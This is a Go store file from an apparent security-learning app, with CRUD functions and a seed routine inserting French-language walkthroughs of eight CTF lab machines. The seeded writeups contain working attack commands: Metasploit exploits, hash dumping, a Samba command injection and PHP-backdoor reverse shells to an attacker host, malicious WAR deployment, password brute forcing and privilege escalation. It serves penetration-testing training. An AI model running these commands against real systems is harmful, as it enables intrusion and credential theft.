package store

import (
	"strings"

	"github.com/cyber-hub/cyber-hub/internal/models"
)

func ListCTF(platform, difficulty, search string, page, limit int) ([]models.CTFWriteup, int64, error) {
	q := DB.Model(&models.CTFWriteup{})
	if platform != "" {
		q = q.Where("platform = ?", platform)
	}
	if difficulty != "" {
		q = q.Where("difficulty = ?", difficulty)
	}
	if search != "" {
		t := "%" + strings.ToLower(search) + "%"
		q = q.Where("LOWER(title) LIKE ? OR LOWER(machine_name) LIKE ? OR LOWER(tags) LIKE ?", t, t, t)
	}
	var total int64
	q.Count(&total)

	q = q.Order("created_at DESC")
	if page > 0 && limit > 0 {
		q = q.Offset((page - 1) * limit).Limit(limit)
	}
	var items []models.CTFWriteup
	err := q.Find(&items).Error
	return items, total, err
}

func GetCTFByID(id uint) (*models.CTFWriteup, error) {
	var item models.CTFWriteup
	err := DB.First(&item, id).Error
	return &item, err
}

func CreateCTF(req *models.CTFCreateRequest) (*models.CTFWriteup, error) {
	item := models.CTFWriteup{
		Title: req.Title, Platform: req.Platform,
		MachineName: req.MachineName, Difficulty: req.Difficulty,
		Category: req.Category, Content: req.Content,
		Flags: req.Flags, Tags: req.Tags, Completed: req.Completed,
	}
	err := DB.Create(&item).Error
	return &item, err
}

func UpdateCTF(id uint, req *models.CTFCreateRequest) (*models.CTFWriteup, error) {
	item, err := GetCTFByID(id)
	if err != nil {
		return nil, err
	}
	item.Title = req.Title
	item.Platform = req.Platform
	item.MachineName = req.MachineName
	item.Difficulty = req.Difficulty
	item.Category = req.Category
	item.Content = req.Content
	item.Flags = req.Flags
	item.Tags = req.Tags
	item.Completed = req.Completed
	err = DB.Save(item).Error
	return item, err
}

func DeleteCTF(id uint) error {
	return DB.Delete(&models.CTFWriteup{}, id).Error
}

// SeedCTFWriteups insère des writeups CTF de référence si absents.
// Utilise un upsert par titre pour éviter les doublons au redémarrage.
func SeedCTFWriteups() error {
	seeds := []models.CTFCreateRequest{
		{
			Title: "Blue — EternalBlue (MS17-010)", Platform: "TryHackMe",
			MachineName: "Blue", Difficulty: "easy", Category: "windows,exploitation",
			Tags: "eternalblue,ms17-010,smb,meterpreter,windows",
			Completed: true,
			Content: `## Blue — TryHackMe

**Plateforme :** TryHackMe | **Difficulté :** Easy | **OS :** Windows 7

---

### Reconnaissance

` + "```bash" + `
nmap -sV -sC -p 139,445 <IP>
# → Port 445 ouvert, SMB sur Windows 7 → suspect MS17-010
` + "```" + `

### Vérification de la vulnérabilité

` + "```bash" + `
nmap --script smb-vuln-ms17-010 -p 445 <IP>
# → Host is likely VULNERABLE to MS17-010
` + "```" + `

### Exploitation — Metasploit

` + "```bash" + `
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <ton-IP>
run
# → Meterpreter session ouverte 🎉
` + "```" + `

### Post-exploitation

` + "```bash" + `
# Dans Meterpreter :
getsystem            # Escalade vers SYSTEM
hashdump             # Dump des hashes NTLM
# Flags dans C:\Users\*\Desktop\*.txt
` + "```" + `

### Contre-mesures

- **Patcher** : KB4012212 (Windows 7) — désactiver SMBv1 immédiatement
- **Firewall** : bloquer le port 445 en entrée depuis Internet
- **EDR** : détecter les shellcodes EternalBlue (patterns connus)
`,
		},
		{
			Title: "Lame — Samba RCE (CVE-2007-2447)", Platform: "HackTheBox",
			MachineName: "Lame", Difficulty: "easy", Category: "linux,exploitation",
			Tags: "samba,rce,metasploit,linux,usermap_script",
			Completed: true,
			Content: `## Lame — HackTheBox

**Plateforme :** HackTheBox | **Difficulté :** Easy | **OS :** Linux (Ubuntu)

---

### Reconnaissance

` + "```bash" + `
nmap -sV -p 21,22,139,445 <IP>
# → Samba 3.0.20 sur les ports 139/445
# → vsftpd 2.3.4 sur le port 21 (également vulnérable)
` + "```" + `

### Exploitation — Metasploit (Samba usermap_script)

` + "```bash" + `
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS <IP>
set LHOST <ton-IP>
run
# → Shell root direct (pas d'escalade nécessaire)
` + "```" + `

### Exploitation manuelle (sans Metasploit)

` + "```bash" + `
# La vulnérabilité permet d'injecter des commandes via le username SMB
smbclient //IP/tmp -U '/=` + "`" + `nohup nc <LHOST> 4444 -e /bin/sh` + "`" + `'
# Écouter sur LHOST:4444 au préalable
nc -lvnp 4444
` + "```" + `

### Flags

` + "```bash" + `
cat /home/*/user.txt   # Flag utilisateur
cat /root/root.txt     # Flag root
` + "```" + `
`,
		},
		{
			Title: "Legacy — MS08-067 (NetAPI RCE)", Platform: "HackTheBox",
			MachineName: "Legacy", Difficulty: "easy", Category: "windows,exploitation",
			Tags: "ms08-067,netapi,windows-xp,smb,metasploit",
			Completed: true,
			Content: `## Legacy — HackTheBox

**Plateforme :** HackTheBox | **Difficulté :** Easy | **OS :** Windows XP SP3

---

### Reconnaissance

` + "```bash" + `
nmap -sV -sC --script smb-vuln* -p 139,445 <IP>
# → Windows XP SP3 — vulnérable MS08-067 et MS17-010
` + "```" + `

### Exploitation — Metasploit

` + "```bash" + `
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
set LHOST <ton-IP>
run
# → Meterpreter SYSTEM direct sur Windows XP
` + "```" + `

### Post-exploitation

` + "```bash" + `
getuid         # NT AUTHORITY\SYSTEM
hashdump       # Hashes Administrator, Guest...
# Flags dans C:\Documents and Settings\*\Desktop\
` + "```" + `
`,
		},
		{
			Title: "Jerry — Apache Tomcat Manager RCE", Platform: "HackTheBox",
			MachineName: "Jerry", Difficulty: "easy", Category: "web,exploitation",
			Tags: "tomcat,manager,war,rce,default-credentials,windows",
			Completed: true,
			Content: `## Jerry — HackTheBox

**Plateforme :** HackTheBox | **Difficulté :** Easy | **OS :** Windows Server 2012

---

### Reconnaissance

` + "```bash" + `
nmap -sV -p 8080 <IP>
# → Apache Tomcat 7.0.88 sur le port 8080
` + "```" + `

### Accès Tomcat Manager

` + "```bash" + `
# Tenter les credentials par défaut :
# admin:admin, tomcat:tomcat, admin:s3cret, tomcat:s3cret
curl -u admin:s3cret http://<IP>:8080/manager/html
# → Accès au Manager ✓
` + "```" + `

### Déploiement d'un WAR malveillant

` + "```bash" + `
# Générer le payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ton-IP> LPORT=4444 -f war -o shell.war

# Déployer via le manager (ou curl)
curl -v -u admin:s3cret -T shell.war http://<IP>:8080/manager/text/deploy?path=/shell

# Écouter + déclencher
nc -lvnp 4444
curl http://<IP>:8080/shell/
# → Shell SYSTEM 🎉 (Tomcat tourne en tant que SYSTEM)
` + "```" + `
`,
		},
		{
			Title: "Mr Robot — CTF Web + Stéganographie", Platform: "TryHackMe",
			MachineName: "Mr Robot", Difficulty: "medium", Category: "web,steg,linux",
			Tags: "wordpress,hydra,steg,robots.txt,nmap,privilege-escalation",
			Completed: true,
			Content: `## Mr Robot — TryHackMe

**Plateforme :** TryHackMe | **Difficulté :** Medium | **OS :** Linux

---

### Reconnaissance

` + "```bash" + `
nmap -sV -sC <IP>
# → Port 80 (HTTP), 443 (HTTPS), 22 (SSH filtré)
gobuster dir -u http://<IP> -w /wordlists/common.txt -x php,txt
# → /robots.txt, /wp-login.php, /wp-admin → WordPress
` + "```" + `

### Robots.txt — Flag 1 + Wordlist

` + "```bash" + `
curl http://<IP>/robots.txt
# → fsocity.dic (wordlist), key-1-of-3.txt (flag 1)
wget http://<IP>/fsocity.dic
sort -u fsocity.dic > fsocity_uniq.dic  # Dédoublonner (11k → 850 mots)
` + "```" + `

### Brute Force WordPress

` + "```bash" + `
# Trouver le login (Wordpress révèle "Invalid username")
wpscan --url http://<IP> --enumerate u

# Brute force mot de passe
hydra -l elliot -P fsocity_uniq.dic <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR'
# → elliot:****
` + "```" + `

### Shell via Wordpress Theme Editor

` + "```bash" + `
# Appearance → Editor → 404.php → injecter php-reverse-shell
# Écouter : nc -lvnp 4444
# Déclencher : curl http://<IP>/wp-content/themes/twentyfifteen/404.php
` + "```" + `

### Escalade de privilèges

` + "```bash" + `
# Flag 2 dans /home/robot/ (protégé — hash MD5 à cracker)
cat /home/robot/password.raw-md5  # md5 → ****
su robot

# Flag 3 : SUID nmap
find / -perm -4000 2>/dev/null | grep nmap
nmap --interactive
!sh  # → root shell
` + "```" + `
`,
		},
		{
			Title: "Knife — PHP 8.1.0-dev Backdoor RCE", Platform: "HackTheBox",
			MachineName: "Knife", Difficulty: "easy", Category: "web,linux",
			Tags: "php,backdoor,rce,sudo,knife,supply-chain",
			Completed: true,
			Content: `## Knife — HackTheBox

**Plateforme :** HackTheBox | **Difficulté :** Easy | **OS :** Linux (Ubuntu 20.04)

---

### Reconnaissance

` + "```bash" + `
nmap -sV -p 22,80 <IP>
# → PHP/8.1.0-dev — version backdoorée (supply chain attack Mars 2021)
` + "```" + `

### Exploitation de la backdoor PHP

` + "```bash" + `
# La backdoor est dans le header "User-Agentt" (double t)
curl -s http://<IP>/ -H "User-Agentt: zerodiumsystem('id');"
# → uid=1000(james) gid=1000(james)

# Reverse shell
nc -lvnp 4444 &
curl http://<IP>/ -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/<LHOST>/4444 0>&1\"');"
` + "```" + `

### Escalade de privilèges (sudo knife)

` + "```bash" + `
sudo -l
# → (root) NOPASSWD: /usr/bin/knife

# knife exec permet d'exécuter du Ruby en tant que root
sudo knife exec -E 'exec "/bin/bash"'
# → root shell 🎉
` + "```" + `
`,
		},
		{
			Title: "Pickle Rick — Web + Linux Basic", Platform: "TryHackMe",
			MachineName: "Pickle Rick", Difficulty: "easy", Category: "web,linux",
			Tags: "gobuster,source-code,rce,sudo,linux,web",
			Completed: true,
			Content: `## Pickle Rick — TryHackMe

**Plateforme :** TryHackMe | **Difficulté :** Easy | **OS :** Linux

---

### Reconnaissance

` + "```bash" + `
nmap -sV -p 22,80 <IP>
gobuster dir -u http://<IP> -w /wordlists/common.txt -x php,txt,sh
# → /login.php, /robots.txt, /clue.txt
` + "```" + `

### Indices dans le code source et robots.txt

` + "```bash" + `
# Source de la page d'accueil → username: R1ckRul3s
# robots.txt → Wubbalubbadubdub (password)
` + "```" + `

### Accès et exécution de commandes

` + "```bash" + `
# Login sur /login.php → panneau de commandes
# Le filtre bloque "cat" → utiliser "less" ou "strings"
less /var/www/html/Sup3rS3cretPickl3Ingred.txt   # Ingrédient 1
` + "```" + `

### Escalade de privilèges

` + "```bash" + `
sudo -l
# → (ALL) NOPASSWD: ALL → accès root sans mot de passe !
sudo less /root/3rd.txt   # Ingrédient 3
# Ingrédient 2 dans /home/rick/second ingredient
` + "```" + `
`,
		},
		{
			Title: "Basic Pentesting — Linux Enumération", Platform: "TryHackMe",
			MachineName: "Basic Pentesting", Difficulty: "easy", Category: "linux,web",
			Tags: "ssh,smb,hydra,crack,enumeration,linux",
			Completed: true,
			Content: `## Basic Pentesting — TryHackMe

**Plateforme :** TryHackMe | **Difficulté :** Easy | **OS :** Linux (Ubuntu)

---

### Reconnaissance

` + "```bash" + `
nmap -sV -sC -p- <IP>
# → 22 (SSH), 80 (HTTP), 139/445 (SMB), 8009 (AJP), 8080 (HTTP Tomcat)
` + "```" + `

### Enumération SMB

` + "```bash" + `
enum4linux <IP>
# → Utilisateurs : jan, kay
# → Partage accessible : /secret
smbclient //<IP>/secret -N
# → note.txt avec un indice sur les mots de passe
` + "```" + `

### Brute Force SSH

` + "```bash" + `
hydra -l jan -P /wordlists/rockyou.txt ssh://<IP>
# → jan:****
ssh jan@<IP>
` + "```" + `

### Escalade de privilèges

` + "```bash" + `
# Dans le home de kay : .ssh/id_rsa (clé privée protégée par passphrase)
cp /home/kay/.ssh/id_rsa /tmp/
# Cracker la passphrase avec John
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/wordlists/rockyou.txt
# → passphrase: ****
ssh -i id_rsa kay@<IP>
sudo -l  # → kay peut tout faire en sudo
` + "```" + `
`,
		},
	}

	for _, s := range seeds {
		var count int64
		DB.Model(&models.CTFWriteup{}).Where("title = ?", s.Title).Count(&count)
		if count > 0 {
			continue
		}
		if _, err := CreateCTF(&s); err != nil {
			return err
		}
	}
	return nil
}
